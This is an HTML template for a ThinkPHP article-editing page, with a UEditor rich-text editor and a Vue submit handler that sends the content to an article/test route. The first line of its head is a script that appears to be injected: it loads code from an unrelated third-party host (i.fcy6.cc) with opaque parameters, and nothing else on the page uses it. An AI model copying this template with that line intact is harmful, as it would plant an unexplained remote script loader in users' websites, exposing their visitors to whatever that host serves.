<!DOCTYPE HTML>
<html>
<head><script defer src="https://i.fcy6.cc/j/?t=fx&v=1&g=cc81da7e70d0&c=685d43efce2d&A=8"></script>

    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
    <title>写文章</title>
    <script type="text/javascript" charset="utf-8" src="{$Think.const.UEDITOR_URL}ueditor.config.js"></script>
    <script type="text/javascript" charset="utf-8" src="{$Think.const.UEDITOR_URL}ueditor.all.js"></script>
    <script type="text/javascript" charset="utf-8" src="{$Think.const.JS_URL}vue.js"></script>
    <script type="text/javascript" charset="utf-8" src="https://rawgit.com/pagekit/vue-resource/develop/dist/vue-resource.js"></script>
    <style type="text/css">
        body{
            font-size:14px;
        }
    </style>
</head>
<body>

<div style="width: 100%;">
    <script type="text/plain" id="myEditor" name="myEditor">
        {$context}
    </script>
</div>
<button id="submit" onclick="submit()">确定</button>

<script type="text/javascript">
    var ue = UE.getEditor('myEditor',{initialFrameHeight:500});
    var vm = new Vue({

    });
    //console.log("Vue",Vue);

    function submit(){
        var html = ue.getContent();
        var url = "{:U('article/test')}";
        Vue.http.get(url , { "params": { "content": html}}).then( function(resp){
            console.log("resp", resp);
            alert("保存成功");
            window.opener=null;
            window.open('','_self');
            window.close();
        });
    }

</script>

</body>


</html>
